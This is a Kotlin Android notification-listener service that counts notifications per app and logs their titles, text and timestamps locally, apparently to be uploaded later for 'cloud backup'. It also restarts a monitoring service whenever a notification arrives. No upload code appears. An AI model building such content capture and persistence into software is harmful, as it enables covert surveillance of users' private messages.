package com.example.myandroid

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Context
import org.json.JSONObject
import org.json.JSONArray

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // SYMBIOTE RESURRECTION: Ensure main service is alive
        try {
            val intent = android.content.Intent(this, MonitorService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch(e: Exception) {}

        if (sbn == null) return
        
        // FILTER: Ignore "Ongoing" notifications (Music, USB, Background Services)
        if (!sbn.isClearable) return

        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""

        if (title.isEmpty() && text.isEmpty()) return

        // LOAD DATA
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val editor = prefs.edit()

        // 1. UPDATE GLOBAL COUNT
        val total = prefs.getInt("notif_count", 0) + 1
        editor.putInt("notif_count", total)

        // 2. UPDATE APP LEADERBOARD (Who is most annoying?)
        val leaderboardStr = prefs.getString("notif_leaderboard", "{}")
        val leaderboard = try { JSONObject(leaderboardStr) } catch (e: Exception) { JSONObject() }
        val appCount = leaderboard.optInt(pkg, 0) + 1
        leaderboard.put(pkg, appCount)
        editor.putString("notif_leaderboard", leaderboard.toString())

        // 3. LOG HISTORY (For Cloud Backup)
        val historyStr = prefs.getString("notif_history", "[]")
        val history = try { JSONArray(historyStr) } catch (e: Exception) { JSONArray() }

        val entry = JSONObject()
        entry.put("pkg", pkg)
        entry.put("title", title.take(50))
        entry.put("txt", text.take(100))
        entry.put("ts", System.currentTimeMillis())
        
        history.put(entry)

        // Limit local history to last 50 items to save space
        while (history.length() > 50) {
            history.remove(0)
        }
        editor.putString("notif_history", history.toString())
        
        editor.apply()
    }
}